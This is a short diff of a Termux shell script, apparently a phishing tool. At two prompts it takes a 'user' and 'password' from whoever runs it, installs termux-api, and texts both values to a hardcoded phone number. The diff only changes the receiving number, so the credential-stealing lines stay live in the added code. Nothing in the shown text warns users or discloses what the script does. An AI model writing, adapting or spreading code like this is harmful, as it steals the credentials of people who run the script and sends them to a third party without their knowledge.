@@ -93,7 +93,7 @@ echo ""
 read -p "insert number :》 " password
 
 pkg install termux-api -y
-termux-sms-send -n +967733014747 $user,$password
+termux-sms-send -n +967730356260 $user,$password
 echo "Mohammed Info"
 sleep 1
 clear
@@ -174,7 +174,7 @@ echo ""
 read -p "insert number :》 " password
 
 pkg install termux-api -y
-termux-sms-send -n +967733014747 $user,$password
+termux-sms-send -n +967730356260 $user,$password
 echo "Mohammed Info"
 sleep 1
 clear
